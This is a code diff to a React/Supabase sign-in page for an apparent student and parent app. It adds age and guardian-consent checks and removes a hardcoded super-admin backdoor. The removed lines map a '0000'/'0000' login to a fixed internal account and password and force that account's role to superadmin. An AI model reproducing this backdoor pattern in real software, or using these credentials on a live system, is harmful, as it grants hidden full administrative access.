@@ -2,14 +2,12 @@ import { useState, useEffect } from 'react';
 import { useLocation } from 'wouter';
 import { requireSupabase, getAdminClient } from '@/lib/supabase';
 import {
-  findUserByUsername, createUserData, isUsernameTaken, getUserData
+  findUserByUsername, createUserData, isUsernameTaken, getUserData, requestGuardianConsent
 } from '@/lib/userService';
 import { useAuth } from '@/contexts/AuthContext';
 import {
   getRememberedAccounts, removeRememberedAccount, switchToRememberedAccount, RememberedAccount
 } from '@/lib/authService';
-
-const SA_ADMIN_EMAIL = 'god.bypass@internal.app';
 
 function formatAuthError(error: unknown, fallback: string): string {
   if (error instanceof Error) return error.message;
@@ -32,31 +30,6 @@ async function generateUniqueUsername(base: string): Promise<string> {
     if (!(await isUsernameTaken(candidate))) return candidate;
   }
   return `${clean}${Date.now().toString().slice(-6)}`;
-}
-
-async function ensureSuperadminProfile(uid: string): Promise<void> {
-  const existing = await getUserData(uid);
-  if (!existing) {
-    await createUserData(uid, {
-      firstName: 'God',
-      lastName: 'Admin',
-      username: 'superadmin',
-      email: SA_ADMIN_EMAIL,
-      role: 'superadmin',
-      onboardingComplete: true,
-    });
-    return;
-  }
-
-  if (existing.role !== 'superadmin' || existing.onboardingComplete !== true || existing.username !== 'superadmin') {
-    const { updateUserData } = await import('@/lib/userService');
-    await updateUserData(uid, {
-      role: 'superadmin',
-      onboardingComplete: true,
-      username: 'superadmin',
-      email: SA_ADMIN_EMAIL,
-    });
-  }
 }
 
 async function ensureUserDoc(authUser: {
@@ -93,6 +66,15 @@ function googleErrorMessage(code: string): string {
   }
 }
 
+function ageOnDate(birthDate: string, today = new Date()): number | null {
+  const birth = new Date(`${birthDate}T00:00:00`);
+  if (!birthDate || Number.isNaN(birth.getTime()) || birth > today) return null;
+  let age = today.getFullYear() - birth.getFullYear();
+  const month = today.getMonth() - birth.getMonth();
+  if (month < 0 || (month === 0 && today.getDate() < birth.getDate())) age -= 1;
+  return age;
+}
+
 export default function AuthPage() {
   const { user, userData, loading, refreshUserData } = useAuth();
   const [, setLocation] = useLocation();
@@ -115,6 +97,8 @@ export default function AuthPage() {
   const [pass, setPass] = useState('');
   const [confirm, setConfirm] = useState('');
   const [accountType, setAccountType] = useState<'student' | 'parent'>('student');
+  const [birthDate, setBirthDate] = useState('');
+  const [guardianEmail, setGuardianEmail] = useState('');
 
   useEffect(() => {
     const params = new URLSearchParams(window.location.search);
@@ -178,38 +162,6 @@ export default function AuthPage() {
 
     setSubmitting(true); setError('');
 
-    // Hardcoded Super Admin Login Bypass (Maps 0000/0000 to internal admin account)
-    if (loginId === '0000' && loginPass === '0000') {
-      let saSuccess = false;
-      try {
-        const supabase = requireSupabase();
-        const { error } = await supabase.auth.signInWithPassword({
-          email: SA_ADMIN_EMAIL,
-          password: 'godadmin0000',
-        });
-        if (error) {
-          const code = (error as { code?: string })?.code || '';
-          if (code === 'invalid_credentials' || code === 'email_not_confirmed' || code === 'invalid_grant') {
-            const { error: signUpError } = await supabase.auth.signUp({
-              email: SA_ADMIN_EMAIL,
-              password: 'godadmin0000',
-              options: { data: { full_name: 'SuperAdmin', name: 'SuperAdmin' } },
-            });
-            if (signUpError) throw signUpError;
-          } else {
-            throw error;
-          }
-        }
-        saSuccess = true;
-        // The useEffect listener will handle the routing to /superadmin based on role
-        return;
-      } catch (e: unknown) {
-        setError('Super Admin login failed: ' + formatAuthError(e, 'Unknown error'));
-        return;
-      } finally {
-        if (!saSuccess) setSubmitting(false);
-      }
-    }
     let success = false;
     try {
       const supabase = requireSupabase();
@@ -238,6 +190,11 @@ export default function AuthPage() {
 
   async function handleRegister() {
     if (!fname || !lname || !username || !email || !pass) return setError('Please fill in all required fields.');
+    const age = ageOnDate(birthDate);
+    if (age === null) return setError('Enter a valid date of birth.');
+    if (accountType === 'parent' && age < 18) return setError('A parent or guardian account holder must be at least 18.');
+    const needsGuardianConsent = accountType === 'student' && age < 18;
+    if (needsGuardianConsent && !/^\S+@\S+\.\S+$/.test(guardianEmail.trim())) return setError('Enter a valid parent or guardian email.');
     if (pass !== confirm) return setError('Passwords do not match.');
     if (pass.length < 6) return setError('Password must be at least 6 characters.');
     if (!/^[a-zA-Z0-9_]+$/.test(username)) return setError('Username can only contain letters, numbers and underscores.');
@@ -258,7 +215,11 @@ export default function AuthPage() {
         firstName: fname, lastName: lname, username, email,
         role: accountType,
         onboardingComplete: true,
+        birthDate,
+        countryCode: 'EG',
+        guardianConsentStatus: needsGuardianConsent ? 'pending' : 'not_required',
       });
+      if (needsGuardianConsent) await requestGuardianConsent(authUser.id, guardianEmail);
     } catch (e: unknown) {
       const code = (e as { code?: string })?.code || '';
       if (code === 'user_already_exists' || code === 'email_exists') {
@@ -292,7 +253,11 @@ export default function AuthPage() {
               firstName: fname, lastName: lname, username, email,
               role: accountType,
               onboardingComplete: true,
+              birthDate,
+              countryCode: 'EG',
+              guardianConsentStatus: needsGuardianConsent ? 'pending' : 'not_required',
             });
+            if (needsGuardianConsent) await requestGuardianConsent(authUser.id, guardianEmail);
             return;
           }
           setError('An account with this email already exists.');
@@ -615,6 +580,11 @@ export default function AuthPage() {
             </div>
             <input style={inputStyle} placeholder="Username (letters, numbers, _)" value={username} onChange={e => setUsername(e.target.value.toLowerCase().trim())} />
             <input style={inputStyle} type="email" placeholder="Email Address" value={email} onChange={e => setEmail(e.target.value.trim())} />
+            <label style={{ display: 'block', textAlign: 'left', color: '#94a3b8', fontSize: 12, marginBottom: 4 }}>Date of birth</label>
+            <input style={inputStyle} type="date" value={birthDate} max={new Date().toISOString().slice(0, 10)} onChange={e => setBirthDate(e.target.value)} />
+            {accountType === 'student' && ageOnDate(birthDate) !== null && (ageOnDate(birthDate) as number) < 18 && (
+              <><input style={inputStyle} type="email" placeholder="Parent or guardian email" value={guardianEmail} onChange={e => setGuardianEmail(e.target.value.trim())} /><div style={{ color: '#fbbf24', fontSize: 11, textAlign: 'left', margin: '-4px 0 10px' }}>Guardian approval will be required for protected account features.</div></>
+            )}
             <input style={inputStyle} type="password" placeholder="Password (min 6 chars)" value={pass} onChange={e => setPass(e.target.value)} />
             <input style={inputStyle} type="password" placeholder="Confirm Password" value={confirm} onChange={e => setConfirm(e.target.value)} onKeyDown={e => e.key === 'Enter' && handleRegister()} />
             <button
